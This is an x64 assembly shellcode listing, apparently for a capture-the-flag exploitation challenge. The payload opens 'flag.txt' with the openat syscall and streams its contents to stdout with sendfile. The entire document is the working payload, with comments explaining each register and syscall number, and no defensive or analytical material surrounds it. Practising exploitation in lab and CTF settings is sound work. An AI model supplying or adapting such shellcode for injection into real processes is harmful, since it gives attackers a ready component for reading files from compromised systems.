; x64 openat("flag.txt", O_RDONLY) + sendfile(1, fd, NULL, 100) shellcode
; opens a file and streams it straight to stdout, no read/write loop
; size: 60 bytes
global _start

section .text
_start:

    xor rax, rax
    push rax
    mov rbx, 'flag.txt'
    push rbx
    mov rsi, rsp        ; rsi = pointer to "flag.txt" string on the stack
    mov rdi, -100        ; rdi = AT_FDCWD, so the path is resolved relative to cwd
    mov edx, eax         ; rdx = flags = 0 (O_RDONLY)
    mov r10, rax         ; r10 = mode = 0 (unused for O_RDONLY)
    mov ax, 257          ; syscall number for openat
    syscall
    ; rax now holds the fd returned by openat

    mov rsi, rax         ; rsi = in_fd for sendfile = the fd we just opened
    xor rax, rax
    xor rdi, rdi
    mov dil, 1           ; rdi = out_fd for sendfile = 1 (stdout)
    mov edx, eax         ; rdx = offset = NULL (start from beginning of file)
    xor r10, r10
    mov r10b, 100        ; r10 = count = 100 bytes to send
    mov al, 40           ; syscall number for sendfile
    syscall
